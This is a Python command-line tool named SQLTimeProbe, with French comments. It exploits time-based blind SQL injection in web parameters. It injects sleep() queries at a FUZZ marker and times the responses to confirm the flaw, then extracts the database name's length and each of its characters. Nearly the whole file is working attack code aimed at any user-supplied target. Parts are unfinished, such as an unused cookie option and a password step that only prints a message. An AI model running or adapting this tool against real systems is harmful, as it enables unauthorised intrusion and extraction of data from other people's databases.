import requests
import time
import argparse
import urllib.parse
import re
import string

# ASCII art
ascii_art = """\033[91m
███████╗ ██████╗ ██╗  ████████╗██╗███╗   ███╗███████╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██╔═══██╗██║  ╚══██╔══╝██║████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
███████╗██║   ██║██║     ██║   ██║██╔████╔██║█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
╚════██║██║▄▄ ██║██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║███████╗██║     ██║  ██║╚██████╔╝██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
    \033[0m                                                                                          
"""

SLEEP_TIME = 2

ALPHABET = string.ascii_letters + string.digits + " !\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~%"

verif_payload = "select sleep(2)"
verif_payload_urlencode ="select%20sleep%282%29"

############## FONCTIONS ##############

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RED_BOLD = '\033[91m\033[1m'
    GREEN_BOLD = '\033[92m\033[1m'
    BLUE_BOLD = '\033[94m\033[1m'
    END = '\033[0m'

def print_redb(text):
    print(f"{colors.RED_BOLD}{text}{colors.END}")

def print_greenb(text):
    print(f"{colors.GREEN_BOLD}{text}{colors.END}")

def print_red(text):
    print(f"{colors.RED}{text}{colors.END}")

def print_green(text):
    print(f"{colors.GREEN}{text}{colors.END}")

def print_blue(text):
    print(f"{colors.BLUE}{text}{colors.END}")

# Découpe une chaîne de caractères en deux parties lorsqu'il y a FUZZ.
def split_at_fuzz(input_string):
    parts = input_string.split("FUZZ")
    if len(parts) == 1:
        return parts[0], ""
    else:
        return parts[0], parts[1]

# Ajoute une payload, soit pour l'attaque, soit pour la vérification
def add_payload(input_string, payload):
    before_fuzz, after_fuzz = split_at_fuzz(input_string)
    return before_fuzz + payload + after_fuzz

# Encode une chaîne de caractères conformément aux spécifications URL.
def urlencode(string_to_encode):
    return urllib.parse.quote(string_to_encode)

# Encode une chaîne de caractères entre <@urlencode> et </@urlencode> conformément aux spécifications URL.
# def urlencode_in_tags(input_string):
#     def encode_match(match):
#         return urlencode(match.group(1))
#     return re.sub(r'<@urlencode>(.*?)</@urlencode>', encode_match, input_string)

def urlencode_in_tags(input_string):
    return re.sub(r'<@urlencode>(.*?)<@/urlencode>', lambda x: f"{urllib.parse.quote(x.group(1))}", input_string)

# Fonction pour exécuter la requête SQL et mesurer le temps de réponse
def get_request(url, params, cookies=None, verbose=0):
    start_time = time.time()
    response = requests.get(url, params=params, cookies=cookies)
    if response.status_code!=200:
        print_red("[-] Error with request (Error " + str(response.status_code) + ")")
    elif verbose > 0:
        print_green("[+] Request ok, status " + str(response.status_code) + "")
    end_time = time.time()
    return end_time - start_time

# Fonction pour vérifier si une requête prend plus de 5 secondes
def check_response_time(response_time):
    if response_time > SLEEP_TIME:
        return True
    else:
        return False

def verify(url, params):
    print_blue('[X] Verification of SQL Time-Based injection for ' + url)
    params=add_payload(params, verif_payload)
    params=urlencode_in_tags(params)
    response_time=get_request(url, params)
    if check_response_time(response_time):
        print_greenb('[+] Injection SQL Time-Based verificated')
    else:
        print_redb('[-] Injection not exploitable/unverified')
    return check_response_time(response_time)

def attack_one_payload(url, params, payload, verbose=0):
    params=add_payload(params, payload)
    params=urlencode_in_tags(params)
    response_time=get_request(url, params)
    if check_response_time(response_time):
        if verbose > 1:
            print_greenb('[+] Effective payload')
        return True
    else:
        if verbose > 1:
            print_redb('[-] Non effective payload')
        return False

def attack_get_length(url, params):
    for i in range(1, 20):
        mask = '_' * i
        query = f"select sleep(10) from dual where database() like '{mask}'"
        if attack_one_payload(url,params, query):
            return i
    print_redb('[-] Error: Length >20 caracters')
    return -1

def attack_get_databasename(url, params, length, database_name=""):
    for char in ALPHABET:
        mask = database_name + char + '_' * (length - 1)
        query = f"select sleep(10) from dual where database() like '{mask}'"
        if attack_one_payload(url, params, query):
            if length == 1:
                return char
            else:
                print_greenb("[+] Retrieve database name : Length " + str(length) + ", Step retrieve :" + mask)
                return char + attack_get_databasename(url, params, length - 1, database_name+char)
    print_redb('[-] Erreur: Caracter not in alphabet')
    return " "

def attack_main(url, params):
    print_blue('[X] Retrieving the database name via SQL Time-Based injection via ' + url)
    print_blue("[X] Retrieve database name length")
    database_length = attack_get_length(url, params)
    if database_length != -1:
        print_greenb("[+] Database name length : " + str(database_length))
    else:
        return -1
    print_blue("[X] Retrieve database name")
    database_name = attack_get_databasename(url, params, database_length)
    print_greenb("[+] Database name : " + database_name)
    print_blue("[X] Retrieve password")

print(ascii_art)

# Command-line arguments parsing
parser = argparse.ArgumentParser(description="SQLTimeProbe: script to exploit Time-Based SQL Injection")
parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
parser.add_argument("-u", "--url", help="Target URL")
parser.add_argument("-p", "--params", help="Request parameters (format 'test=1&test=2&test=3') (with FUZZ for fuzzing)")
parser.add_argument("-a", "--attack", action="store_true", help="Retrieve information in the database")
parser.add_argument("-V", "--verify", action="store_true", help="Verify Time-Based SQL Injection")
parser.add_argument("-c", "--cookies", help="Cookies to include in the request (format 'cookie1=value1;cookie2=value2')")
args = parser.parse_args()


# Si mode interactif est activé
if args.interactive:
    url = input("Entrez l'URL de la cible : ")
    params = input("Entrez vos paramètres de la rêquete (au format 'test=1&test=2&test=3') (avec FUZZ pour le fuzzing) :")
# Si l'utilisateur fournit l'URL et la requête en ligne de commande
elif args.url and args.params:
    url = args.url
    params = args.params
    attack = args.attack
    cookies = args.cookies
    if args.verify:
        verify(url, params)
    if args.attack:
        verify(url, params)
        attack_main(url, params)
else:
    print("Veuillez utiliser -i pour le mode interactif ou -u pour l'URL et -p pour les paramètres.")
    exit()
